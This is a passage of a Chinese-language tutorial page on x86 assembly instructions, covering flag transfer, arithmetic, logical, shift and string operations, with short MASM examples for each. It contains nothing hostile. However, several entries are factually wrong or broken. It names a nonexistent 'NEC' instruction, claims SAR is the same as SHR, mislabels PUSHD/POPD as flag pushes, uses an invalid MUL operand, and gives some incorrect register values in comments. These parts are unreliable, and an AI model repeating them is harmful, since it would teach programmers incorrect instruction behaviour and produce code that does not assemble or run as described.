language-c++\" data-language=\"c++\"><code class=\"language-c++\">LGS DI,string ;把段地址:偏移地址存到GSDI <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"LSS-传送目标指针-把指针内容装入SS\"><a href=\"#LSS-传送目标指针-把指针内容装入SS\" class=\"headerlink\" title=\"LSS 传送目标指针,把指针内容装入SS\"></a>LSS 传送目标指针,把指针内容装入SS</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">LSS DI,string ;把段地址:偏移地址存到SSDI<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"标志传送指令\"><a href=\"#标志传送指令\" class=\"headerlink\" title=\"标志传送指令\"></a>标志传送指令</h1><h3 id=\"LAHF-标志寄存器传送-把标志装入AH\"><a href=\"#LAHF-标志寄存器传送-把标志装入AH\" class=\"headerlink\" title=\"LAHF 标志寄存器传送,把标志装入AH\"></a>LAHF 标志寄存器传送,把标志装入AH</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">.data\n    saveflags byte ?\n.code\n    lahf\n    mov saveflags,ah<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"SAHF-标志寄存器传送-把AH内容装入标志寄存器\"><a href=\"#SAHF-标志寄存器传送-把AH内容装入标志寄存器\" class=\"headerlink\" title=\"SAHF 标志寄存器传送,把AH内容装入标志寄存器\"></a>SAHF 标志寄存器传送,把AH内容装入标志寄存器</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ah,saveflags\n    sahf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"PUSHF-标志入栈\"><a href=\"#PUSHF-标志入栈\" class=\"headerlink\" title=\"PUSHF 标志入栈\"></a>PUSHF 标志入栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">pushf;保存标志寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"POPF-标志出栈\"><a href=\"#POPF-标志出栈\" class=\"headerlink\" title=\"POPF 标志出栈\"></a>POPF 标志出栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">popf;恢复标志寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"PUSHD-32位标志入栈\"><a href=\"#PUSHD-32位标志入栈\" class=\"headerlink\" title=\"PUSHD 32位标志入栈\"></a>PUSHD 32位标志入栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">pushd;保存32通用寄存器内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"POPD-32位标志出栈\"><a href=\"#POPD-32位标志出栈\" class=\"headerlink\" title=\"POPD 32位标志出栈\"></a>POPD 32位标志出栈</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">popd;恢复32通用寄存器内存<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h1 id=\"算术运算指令\"><a href=\"#算术运算指令\" class=\"headerlink\" title=\"算术运算指令\"></a>算术运算指令</h1><h3 id=\"ADD-加法\"><a href=\"#ADD-加法\" class=\"headerlink\" title=\"ADD 加法\"></a>ADD 加法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov eax,1\nadd eax,12<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"ADC-带进位加法\"><a href=\"#ADC-带进位加法\" class=\"headerlink\" title=\"ADC 带进位加法\"></a>ADC 带进位加法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov dl,0\nmov al,0FFh\nadd al,0FFh;AL=FEh\nadc dl,0;DL/AL=01FEh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"INC-加-1\"><a href=\"#INC-加-1\" class=\"headerlink\" title=\"INC 加 1\"></a>INC 加 1</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,1\ninc ax<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"AAA-加法的ASCII码调整\"><a href=\"#AAA-加法的ASCII码调整\" class=\"headerlink\" title=\"AAA 加法的ASCII码调整\"></a>AAA 加法的ASCII码调整</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ah,0\nmov al,'8';AX=0038h\nadd al,'2';AX=006Ah\naaa;AX=0100h(结果进行ASCII转换)\nor ax,3030h;AX=3130h='10'(转换为ASCII码)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DAA-加法的十进制调整\"><a href=\"#DAA-加法的十进制调整\" class=\"headerlink\" title=\"DAA 加法的十进制调整\"></a>DAA 加法的十进制调整</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,35h\nadd al,48h;AL=7Dh\ndaa;AL=83h(调整后结果)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"SUB-减法\"><a href=\"#SUB-减法\" class=\"headerlink\" title=\"SUB 减法\"></a>SUB 减法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,23\nsub al,3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"SBB-带借位减法\"><a href=\"#SBB-带借位减法\" class=\"headerlink\" title=\"SBB 带借位减法\"></a>SBB 带借位减法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov edx,7;高32位\nmov eax,1;低32位\nsub eax，2\nsbb edx，0;高32位减法<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DEC-减-1\"><a href=\"#DEC-减-1\" class=\"headerlink\" title=\"DEC 减 1\"></a>DEC 减 1</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">dec al<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"NEC-求反-以-0-减之\"><a href=\"#NEC-求反-以-0-减之\" class=\"headerlink\" title=\"NEC 求反(以 0 减之)\"></a>NEC 求反(以 0 减之)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">nec al<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"CMP-比较-两操作数作减法-仅修改标志位-不回送结果\"><a href=\"#CMP-比较-两操作数作减法-仅修改标志位-不回送结果\" class=\"headerlink\" title=\"CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)\"></a>CMP 比较.(两操作数作减法,仅修改标志位,不回送结果)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,5\ncmp ax,10;ZF=0 and CF=1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"AAS-减法的ASCII码调整\"><a href=\"#AAS-减法的ASCII码调整\" class=\"headerlink\" title=\"AAS 减法的ASCII码调整\"></a>AAS 减法的ASCII码调整</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ah,0\nmov al,'8';AX=0038h\nsub al,'9';AX=00FFh\naas;AX=FF09h\npushf\nor al,30h;AX=FF39h\npopf<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DAS-减法的十进制调整\"><a href=\"#DAS-减法的十进制调整\" class=\"headerlink\" title=\"DAS 减法的十进制调整\"></a>DAS 减法的十进制调整</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov bl,48h\nmov al,85h\nsub al,bl;AL=3Dh\ndas;AL=37h(调整后结果)<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"MUL-无符号乘法\"><a href=\"#MUL-无符号乘法\" class=\"headerlink\" title=\"MUL 无符号乘法\"></a>MUL 无符号乘法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var word 0100h\nmov ax,2000h;AX=2000h;AX存储结果\nmul 0100h/var;DX:AX=00200000h,CF=1;32位EDX:EAX<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"IMUL-整数乘法\"><a href=\"#IMUL-整数乘法\" class=\"headerlink\" title=\"IMUL 整数乘法\"></a>IMUL 整数乘法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,48\nmov bx,4\nimul bx;DX:AX=000000C0h,OF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算\"><a href=\"#以上两条-结果回送AH和AL-字节运算-或DX和AX-字运算\" class=\"headerlink\" title=\"以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)\"></a>以上两条,结果回送AH和AL(字节运算),或DX和AX(字运算)</h3><h3 id=\"AAM-乘法的ASCII码调整\"><a href=\"#AAM-乘法的ASCII码调整\" class=\"headerlink\" title=\"AAM 乘法的ASCII码调整\"></a>AAM 乘法的ASCII码调整</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var byte 05h,06h\nmov bl,var;第一个操作数\nmov bl,[var+1];第二个操作数\nmul bl;AX=001Eh\naam;AX=0300h<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"DIV-无符号除法\"><a href=\"#DIV-无符号除法\" class=\"headerlink\" title=\"DIV 无符号除法\"></a>DIV 无符号除法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,0083h;被除数\nmov bl,2;除数\ndiv bl;AL=41h,AH=01h<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"IDIV-整数除法\"><a href=\"#IDIV-整数除法\" class=\"headerlink\" title=\"IDIV 整数除法\"></a>IDIV 整数除法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var sword -101;009Bh\nmov dx,0\nmov ax,var;DX:AX=0000009Bh(+155)\nmov bx,2;BX是除数\nidiv bx;DX:AX除以BX\n    \nvar sword -48\nmov al,var;被除数低字节\ncbw；AL扩展到AH\nmov bl,+5;除数\nidiv bl;AL=-9,AH=-3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"以上两条-结果回送\"><a href=\"#以上两条-结果回送\" class=\"headerlink\" title=\"以上两条,结果回送:\"></a>以上两条,结果回送:</h3><h3 id=\"商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算\"><a href=\"#商回送AL-余数回送AH-字节运算-或商回送AX-余数回送DX-字运算\" class=\"headerlink\" title=\"商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)\"></a>商回送AL,余数回送AH, (字节运算);或商回送AX,余数回送DX, (字运算)</h3><h3 id=\"AAD-除法的ASCII码调整\"><a href=\"#AAD-除法的ASCII码调整\" class=\"headerlink\" title=\"AAD 除法的ASCII码调整\"></a>AAD 除法的ASCII码调整</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var byte ?\nvar2 byte ?\nmov ax,0307h;被除数\naad;AX=0025h\nmov bl,5;除数\ndiv bl;AX=0207h\nmov var,al\nmov var2,ah<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CBW-字节转换为字-把AL中字节的符号扩展到AH中去\"><a href=\"#CBW-字节转换为字-把AL中字节的符号扩展到AH中去\" class=\"headerlink\" title=\"CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)\"></a>CBW 字节转换为字. (把AL中字节的符号扩展到AH中去)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var sword -101;9Bh\nmov al,var;AL=9Bh\ncbw;AL=FF9Bh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CWD-字转换为双字-把AX中的字的符号扩展到DX中去\"><a href=\"#CWD-字转换为双字-把AX中的字的符号扩展到DX中去\" class=\"headerlink\" title=\"CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)\"></a>CWD 字转换为双字. (把AX中的字的符号扩展到DX中去)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">var sword -101;FF9Bh\nmov ax,var;AX=FF9Bh\ncwd;DX:AX=FFFFFF9Bh<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CWDE-字转换为双字-把AX中的字符号扩展到EAX中去\"><a href=\"#CWDE-字转换为双字-把AX中的字符号扩展到EAX中去\" class=\"headerlink\" title=\"CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)\"></a>CWDE 字转换为双字. (把AX中的字符号扩展到EAX中去)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去\"><a href=\"#CDQ-双字扩展-把EAX中的字的符号扩展到EDX中去\" class=\"headerlink\" title=\"CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)\"></a>CDQ 双字扩展. (把EAX中的字的符号扩展到EDX中去)</h3><pre class=\"line-numbers language-C++\" data-language=\"C++\"><code class=\"language-C++\">var sword -101;FFFFFF9Bh\nmov eax,var;EDX:EAX=FFFFFFFFFFFFFF9Bh\ncdq<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"逻辑运算指令\"><a href=\"#逻辑运算指令\" class=\"headerlink\" title=\"逻辑运算指令\"></a>逻辑运算指令</h1><h3 id=\"AND-与运算\"><a href=\"#AND-与运算\" class=\"headerlink\" title=\"AND 与运算\"></a>AND 与运算</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,10101110b\nand al,11110110b;消除位0,3<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"OR-或运算\"><a href=\"#OR-或运算\" class=\"headerlink\" title=\"OR 或运算\"></a>OR 或运算</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,11100011b\nor al,00000100b;位2置1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"XOR-异或运算\"><a href=\"#XOR-异或运算\" class=\"headerlink\" title=\"XOR 异或运算\"></a>XOR 异或运算</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,10110101b\nxor al,0;异或<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"NOT-取反\"><a href=\"#NOT-取反\" class=\"headerlink\" title=\"NOT 取反\"></a>NOT 取反</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,10101110b\nnot al;补集<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"TEST-测试-两操作数作与运算-仅修改标志位-不回送结果\"><a href=\"#TEST-测试-两操作数作与运算-仅修改标志位-不回送结果\" class=\"headerlink\" title=\"TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)\"></a>TEST 测试(两操作数作与运算,仅修改标志位,不回送结果)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">test al,00001001b;测试0,3位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"SHL-逻辑左移-位元乘法\"><a href=\"#SHL-逻辑左移-位元乘法\" class=\"headerlink\" title=\"SHL 逻辑左移,位元乘法\"></a>SHL 逻辑左移,位元乘法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov bl,8Fh;BL=10001111b\nshl bl,1;CF=1,BL=00011110b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"SAL-算术左移-SHL\"><a href=\"#SAL-算术左移-SHL\" class=\"headerlink\" title=\"SAL 算术左移(=SHL)\"></a>SAL 算术左移(=SHL)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">sal/shl<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"SHR-逻辑右移，位元除法\"><a href=\"#SHR-逻辑右移，位元除法\" class=\"headerlink\" title=\"SHR 逻辑右移，位元除法\"></a>SHR 逻辑右移，位元除法</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,0D0h;AL=11010000b\nshr al,1;AL=01101000b,CF=0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<h3 id=\"SAR-算术右移-SHR\"><a href=\"#SAR-算术右移-SHR\" class=\"headerlink\" title=\"SAR 算术右移(=SHR)\"></a>SAR 算术右移(=SHR)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">sar/shr<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"ROL-循环左移\"><a href=\"#ROL-循环左移\" class=\"headerlink\" title=\"ROL 循环左移\"></a>ROL 循环左移</h3><pre class=\"line-numbers language-C++\" data-language=\"C++\"><code class=\"language-C++\">mov al,40h;AL=01000000b\nrol al,1;AL=10000000b\nrol al,3;AL=00000100b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"ROR-循环右移\"><a href=\"#ROR-循环右移\" class=\"headerlink\" title=\"ROR 循环右移\"></a>ROR 循环右移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov al,01h;AL=00000001b\nror al,1;AL=10000000b\nror al,3;AL=00010000b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"RCL-通过进位的循环左移\"><a href=\"#RCL-通过进位的循环左移\" class=\"headerlink\" title=\"RCL 通过进位的循环左移\"></a>RCL 通过进位的循环左移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">clc;CF=0\nmov bl,88h;CF,BL=0 10001000b\nrcl bl,1;CF,BL=1 00010000b\nrcl bl,1;CF,BL=0 00100010b<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"RCR-通过进位的循环右移\"><a href=\"#RCR-通过进位的循环右移\" class=\"headerlink\" title=\"RCR 通过进位的循环右移\"></a>RCR 通过进位的循环右移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">stc ;CF=1\nmov ah,10h;AH,CF=00010000 1\nrcr ah,1;AH,CF=10001000 0<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>以上八种移位指令,其移位次数可达255次</p>\n<p>移位一次时, 可直接用操作码. 如 SHL AX,1</p>\n<p>移位&gt;1次时, 则由寄存器CL给出移位次数</p>\n<p>如 MOV CL,04 SHL AX,CL</p>\n<h3 id=\"SHLD-双精度左移\"><a href=\"#SHLD-双精度左移\" class=\"headerlink\" title=\"SHLD 双精度左移\"></a>SHLD 双精度左移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">wval word 9BA6h\nmov ax,0AC36h\nshld wval,ax,4;wval=BA6Ah,将wval左移4位，并把AX的高4位插入wval的低4位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"SHRD-双精度右移\"><a href=\"#SHRD-双精度右移\" class=\"headerlink\" title=\"SHRD 双精度右移\"></a>SHRD 双精度右移</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">mov ax,234Bh\nmov dx,7654h\nshrd ax,dx,4;AX右移4位，并把DX的低4位插入AX的高4位<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"串指令\"><a href=\"#串指令\" class=\"headerlink\" title=\"串指令\"></a>串指令</h1><h3 id=\"DS-SI-源串段寄存器-源串变址\"><a href=\"#DS-SI-源串段寄存器-源串变址\" class=\"headerlink\" title=\"DS:SI 源串段寄存器 :源串变址\"></a>DS:SI 源串段寄存器 :源串变址</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"ESI-目标串段寄存器-目标串变址\"><a href=\"#ESI-目标串段寄存器-目标串变址\" class=\"headerlink\" title=\"ESI 目标串段寄存器:目标串变址\"></a>ESI 目标串段寄存器:目标串变址</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"CX-重复次数计数器\"><a href=\"#CX-重复次数计数器\" class=\"headerlink\" title=\"CX 重复次数计数器\"></a>CX 重复次数计数器</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"AL-AX-扫描值\"><a href=\"#AL-AX-扫描值\" class=\"headerlink\" title=\"AL/AX 扫描值\"></a>AL/AX 扫描值</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量\"><a href=\"#D标志-0表示重复操作中SI和DI应自动增量-1表示应自动减量\" class=\"headerlink\" title=\"D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量\"></a>D标志 0表示重复操作中SI和DI应自动增量; 1表示应自动减量</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"Z标志-用来控制扫描或比较操作的结束\"><a href=\"#Z标志-用来控制扫描或比较操作的结束\" class=\"headerlink\" title=\"Z标志 用来控制扫描或比较操作的结束\"></a>Z标志 用来控制扫描或比较操作的结束</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">NULL<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字\"><a href=\"#MOVS-串传送-MOVSB-传送字符-MOVSW-传送字-MOVSD-传送双字\" class=\"headerlink\" title=\"MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )\"></a>MOVS 串传送   ( MOVSB 传送字符 MOVSW 传送字 MOVSD 传送双字 )</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">;传送字符串数据：将ESI寻址的内存数据复制到EDI寻址的内存位置\n;复制双字数值\nsource dword 20 dup(0FFFFFFFh)\ntarget dword 20 dup(?)\n.code\ncld;方向为正\nmov ecx,lengthof source;设置REP计数器\nmov esi,offset source;ESI指向source\nmov edi,offset target;EDI指向target\nrep movsd;复制双字<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"CMPS-串比较-CMPSB-比较字符-CMPSW-比较字\"><a href=\"#CMPS-串比较-CMPSB-比较字符-CMPSW-比较字\" class=\"headerlink\" title=\"CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )\"></a>CMPS 串比较   ( CMPSB 比较字符 CMPSW 比较字 )</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">;比较字符串：比较分别由ESI和EDI寻址的内存数据\n;比较双字\nmov esi OFFSET source\nmov edi ,OFFSET target\ncld;方向为正向\nmov ecx, LENGTHOF source;设置重复计数器\nrepe cmpsd;相等则重复<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位\"><a href=\"#SCAS-串扫描-把AL或AX的内容与目标串作比较-比较结果反映在标志位\" class=\"headerlink\" title=\"SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位\"></a>SCAS 串扫描    把AL或AX的内容与目标串作比较,比较结果反映在标志位</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">;扫描字符串：比较累加器（AL、AX和EAX）与EDI寻址的内存数据\n;扫描是否有匹配字符\nalpha BYTE \"ABCDEFGH\",0\n.code\nmov edi,OFFSET alpha;EDI指向字符串\nmov al,'F';检索字符F\nmov ecx,LENGTHOF alpha;设置检索计数器\ncld;方向为正向\nrepne scasb;不相等则重复\njnz quit;若未发现字符则退出\ndec edi;发现字符: EDI减1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字\"><a href=\"#LODS-装入串-把源串中的元素-字或字节-逐一装入AL或AX中-LODSB-传送字符-LODSW-传送字-LODSD-传送双字\" class=\"headerlink\" title=\"LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )\"></a>LODS 装入串    把源串中的元素(字或字节)逐一装入AL或AX中( LODSB 传送字符 LODSW 传送字 LODSD 传送双字 )</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">;从字符串加载到累加器：将ESI寻址的内存数据加载到累加器\n;数组乘法\n:本程序将一个32位整数数组中的每个元素都乘以一个常数。\nINCLUDE Irvine32. inc\n.data\narray DWORD 1,2,3,4,5,6,7,8,9,10;测试数据\nmultiplier DWORD 10;测试数据\n.code\nmain PROC\n    cld;方向为正向\n    mov esi,OFFSET array;源数组索引\n    mov edi,esi;目标数组索引\n    mov ecx,LENGTHOF array;循环计数器\nLl: lodsd;将[ESI]加载到EAX\n    mul multiplier;与常数相乘\n    stosd;将EAX保存到[EDI]\n    loop Ll\n    exit\nmain ENDP\nEND main<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"STOS-保存串-是LODS的逆过程\"><a href=\"#STOS-保存串-是LODS的逆过程\" class=\"headerlink\" title=\"STOS 保存串   是LODS的逆过程\"></a>STOS 保存串   是LODS的逆过程</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">;保存字符串数据L：将累加器内容保存到EDI寻址的内存位置\n.data\nCount = 100\nstring1 BYTE Count DUP(?)\n.code\nmov al,OFFh;要保存的数值\nmov edi,OFFSET string1;EDI指向目标字符串\nmov ecx,Count;字符计数器\ncld;方向为正向\nrep stosb;用AL的内容实现填充<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"REP-当CX-ECX0时重复-单个指令处理整个字符串\"><a href=\"#REP-当CX-ECX0时重复-单个指令处理整个字符串\" class=\"headerlink\" title=\"REP 当CX/ECX<>0时重复(单个指令处理整个字符串)\"></a>REP 当CX/ECX&lt;&gt;0时重复(单个指令处理整个字符串)</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code class=\"language-c++\">rep movsb<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h3 id=\"REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX0时重复\"><a href=\"#REPE-REPZ-当ZF-1或比较结果相等-且CX-ECX0时重复\" class=\"headerlink\" title=\"REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX<>0时重复\"></a>REPE/REPZ 当ZF=1或比较结果相等,且CX/ECX&lt;&gt;0时重复</h3><pre class=\"line-numbers language-c++\" data-language=\"c++\"><code 